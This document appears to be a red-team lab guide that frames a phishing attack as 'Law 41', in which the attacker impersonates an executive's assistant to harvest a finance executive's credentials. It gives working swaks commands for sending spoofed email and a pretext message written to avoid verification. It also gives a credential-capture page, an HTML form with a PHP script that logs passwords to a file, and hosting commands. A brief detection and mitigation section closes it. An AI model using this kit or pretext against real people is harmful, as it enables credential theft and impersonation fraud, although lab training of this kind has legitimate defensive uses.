## **Law 41 — Avoid Stepping into a Great Man’s Shoes**

Interpretation (offensive context):  
Directly impersonating high-profile figures (CEO, Director) triggers **verification and scrutiny**. Instead, operate through **adjacent, lower-visibility roles** (assistants, coordinators) that interact with the target naturally.

---

# 🎯 Attack Scenario — _Assistant-Level Impersonation (Bypass High-Profile Scrutiny)_

Instead of pretending to be a senior executive, you impersonate their **assistant**, who routinely communicates and requests actions.

**Target:**

> _Daniel Wright_ — Finance Executive

**Avoided Identity (high-risk):**

> CEO / Director (high verification pressure)

**Chosen Persona:**

> _Lucy Ivanova_, 20 y/o Executive Assistant

---

# 🔴 Red Team Objective

- Avoid:
    
    - scrutiny from high-profile impersonation
        
- Achieve:
    
    - compliance via **plausible intermediary role**
        
- Leverage:
    
    - normal delegation workflows
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Incorrect Approach (for contrast)

❌ High-risk impersonation:

```bash
swaks --to daniel@corp.local \
--from ceo@corp.local \
--server 192.168.56.101 \
--data "Subject: Urgent

Complete this immediately:

http://192.168.56.101:8080"
```

👉 Likely outcome:

- verification
    
- suspicion
    
- failure
    

---

## Phase 2 — Correct Approach (Assistant Persona)

```bash
swaks --to daniel@corp.local \
--from lucy.i@corp.local \
--server 192.168.56.101 \
--data "Subject: Quick confirmation for Daniel

Hi,

Daniel asked me to get this confirmed—could you check this quickly?

http://192.168.56.101:8080

Thanks,
Lucy"
```

👉 Advantages:

- plausible role
    
- common workflow
    
- lower scrutiny
    

---

## Phase 3 — Payload

```bash
mkdir assistant && cd assistant
```

```html
<form action="cap.php" method="POST">
<input name="user" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<button>Confirm</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

## Phase 4 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 5 — Execution

Target:

- trusts assistant role
    
- sees normal delegation
    
- complies without escalation
    

👉 Indirect authority → higher success

---

# 🛠️ Tooling + Commands

### Delivery:

```bash
swaks --to daniel@corp.local --from lucy.i@corp.local
```

---

### Hosting:

```bash
php -S 0.0.0.0:8080
```

---

### Capture:

```php
file_put_contents("creds.txt", ...)
```

---

### Target mapping:

```bash
cat employees.csv
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Authority by association**
    
- **Delegation-based trust**
    
- **Pretext realism**
    

Key principle:

> Indirect authority is often more believable than direct authority

---

# 🛡️ Detection & Defensive Insight

Indicators:

- assistant accounts making unusual requests
    
- delegation messages with external links
    
- mismatch between role and request type
    

Mitigation:

- verify:
    
    - requests even from assistants
        
- train:
    
    - “delegation ≠ legitimacy”
        
- monitor:
    
    - assistant-to-executive communication patterns
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Assistant-Level Impersonation and Delegation Trust

### Include:

- failed high-profile attempt (contrast)
    
- assistant-based attack
    
- payload
    
- credential capture
    
- analysis:
    
    - why assistant role reduced scrutiny
        
- impact:
    
    - successful compromise via indirect authority
        

---

# ⚠️ Operator Insight

Impersonating power:

- triggers checks
    

Operating near power:

- bypasses checks
    

You don’t become the authority  
You become **the person who speaks for it**

---

